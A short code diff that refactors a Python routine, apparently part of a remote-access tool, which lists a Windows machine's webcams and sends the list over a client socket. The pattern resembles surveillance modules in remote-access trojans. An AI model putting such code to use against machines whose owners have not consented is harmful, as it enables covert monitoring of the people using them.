@@ -7,16 +7,15 @@ if win_client():
     while True:
         try:
             dev = vidcap.new_Dev(i, 0)
-            names += '   {}. {}\n'.format(i,dev.getdisplayname())
+            names += f'   {i}. {dev.getdisplayname()}\n'
         except Exception as e:
             if i == 0:
                 send(client_socket,"=== Webcam List ===")
                 send(client_socket,"   No video devices detected.\n")
-                break
             else:
                 send(client_socket,"=== Webcam List ===")
                 send(client_socket,names)
-                break
+            break
         else:
             i += 1
 else:
